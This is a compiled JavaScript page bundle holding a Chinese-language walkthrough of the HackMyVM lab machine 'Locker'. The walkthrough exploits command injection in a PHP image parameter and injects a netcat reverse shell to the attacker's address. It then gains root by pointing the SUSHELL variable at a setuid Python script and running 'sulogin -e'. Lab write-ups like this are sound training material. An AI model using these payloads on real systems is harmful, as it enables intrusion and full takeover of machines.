"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7037],{5322:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackMyVm/Machines/Locker","title":"Locker","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/HackMyVm/Machines/Locker.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Locker","permalink":"/docs/HackMyVm/Machines/Locker","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Locker.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Hommie","permalink":"/docs/HackMyVm/Machines/Hommie"},"next":{"title":"Pingme","permalink":"/docs/HackMyVm/Machines/Pingme"}}');var o=r(4848),t=r(8453);const a={},i=void 0,c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u6e17\u900f",id:"web\u6e17\u900f",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"user\u2018s flag",id:"users-flag",level:4},{value:"root&#39;s flag",id:"roots-flag",level:4}];function d(e){const n={code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.115\n"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE\r\n80/tcp open  http\r\nMAC Address: 08:00:27:CA:9E:2A (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,o.jsx)(n.h3,{id:"web\u6e17\u900f",children:"web\u6e17\u900f"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013212206263.png",alt:"image-20241013212206263"})}),"\n",(0,o.jsx)(n.p,{children:"\u5f00\u59cb\u53cd\u5f39shell"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-http",children:"GET /locker.php?image=;nc 192.168.56.101 1234 -e /bin/bash; HTTP/1.1\r\nHost: 192.168.56.115\r\nAccept-Language: zh-CN\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662f\u6587\u4ef6\u8bfb\u53d6\uff0c\u54c8\u54c8"}),"\n",(0,o.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@locker:/var/www/html# cat locker.php \r\n<?php\r\n$image = $_GET[\'image\'];\r\n$command = "cat ".$image.".jpg | base64";\r\n$output = shell_exec($command);\r\nprint\'<img src="data:image/jpg;base64,\'.$output.\'"width="150"height="150"/>\';\r\n?>\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@locker:/var/www/html# find / -type f -perm -u=s 2>/dev/null\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/sbin/sulogin\r\n/usr/bin/umount\r\n/usr/bin/gpasswd\r\n/usr/bin/newgrp\r\n/usr/bin/chfn\r\n/usr/bin/chsh\r\n/usr/bin/passwd\r\n/usr/bin/mount\r\n/usr/bin/su\n"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"sulogin"}),"\u662f\u7279\u6b8a\u7684"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@locker:/tmp$ sulogin \r\n\r\nCannot open access to console, the root account is locked.\r\nSee sulogin(8) man page for more details.\r\n\r\nPress Enter to continue.\n"})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"root"}),"\u7684\u8d26\u6237\u88ab\u9501\u5b9a"]}),"\n",(0,o.jsxs)(n.p,{children:["\u67e5\u770b",(0,o.jsx)(n.code,{children:"sulogin"}),"\u7684\u624b\u518c"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{children:"NAME\r\n       sulogin - single-user login\r\n\r\nSYNOPSIS\r\n       sulogin [options] [tty]\r\n\r\nDESCRIPTION\r\n       sulogin is invoked by init when the system goes into single-user mode.\r\n\r\n       The user is prompted:\r\n\r\n            Give root password for system maintenance\r\n            (or type Control-D for normal startup):\r\n\r\n       If the root account is locked and --force is specified, no password is required.\r\n\r\nOPTIONS\r\n       -e, --force\r\n              If  the  default method of obtaining the root password from the system via getpwnam(3) fails, then examine /etc/passwd and /etc/shadow to get the pass-\r\n              word.  If these files are damaged or nonexistent, or when root account is locked by '!' or '*' at the begin of the password then sulogin will  start  a\r\n              root shell without asking for a password.\r\n\r\nENVIRONMENT VARIABLES\r\n       sulogin  looks  for the environment variable SUSHELL or sushell to determine what shell to start.  If the environment variable is not set, it will try to exe-\r\n       cute root's shell from /etc/passwd.  If that fails, it will fall back to /bin/sh.\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u5f53",(0,o.jsx)(n.code,{children:"root"}),"\u7684\u8d26\u6237\u88ab\u9501\u5b9a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528",(0,o.jsx)(n.code,{children:"-e"}),"\u9009\u9879\uff0c\u4e0d\u7528\u8f93\u5165\u5bc6\u7801\u5c31\u8fdb\u5165root\u7684shell"]}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.code,{children:"sulogin"}),"\u5728\u5355\u7528\u6237\u767b\u5f55\u4f1a\u67e5\u770b",(0,o.jsx)(n.code,{children:"SUSHELL\u73af\u5883\u53d8\u91cf"}),",\u5e76\u4e14\u6839\u636eSUSHELL\u53d8\u91cf\u6253\u5f00\u6307\u5b9ashell"]}),"\n",(0,o.jsx)(n.p,{children:"\u6211\u4eec\u5229\u7528python\uff0c\u5199\u4e00\u4e2a\u5c0f\u7684\u811a\u672c"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\r\n\r\nimport os\r\nos.setuid(0)\r\nos.setgid(0)\r\nos.system("/bin/bash")\n'})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@locker:/tmp$ cat s\r\n#!/usr/bin/python3\r\n\r\nimport os\r\nos.setuid(0)\r\nos.setgid(0)\r\nos.system("/bin/bash")\r\n(remote) www-data@locker:/tmp$ chmod 777 s\r\n(remote) www-data@locker:/tmp$ export SUSHELL=/tmp/s\r\n(remote) www-data@locker:/tmp$ echo $SUSHELL\r\n/tmp/s\r\n(remote) www-data@locker:/tmp$ sulogin -e\r\nPress Enter for maintenance\r\n(or press Control-D to continue): \r\nroot@locker:~# ls\r\nflag.sh  root.txt\n'})}),"\n",(0,o.jsx)(n.h4,{id:"users-flag",children:"user\u2018s flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@locker:/home/tolocker# cat user.txt \r\nflaglockeryes\n"})}),"\n",(0,o.jsx)(n.h4,{id:"roots-flag",children:"root's flag"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@locker:/home/tolocker# cat /root/root.txt \r\nigotroothere\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>i});var s=r(6540);const o={},t=s.createContext(o);function a(e){const n=s.useContext(t);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);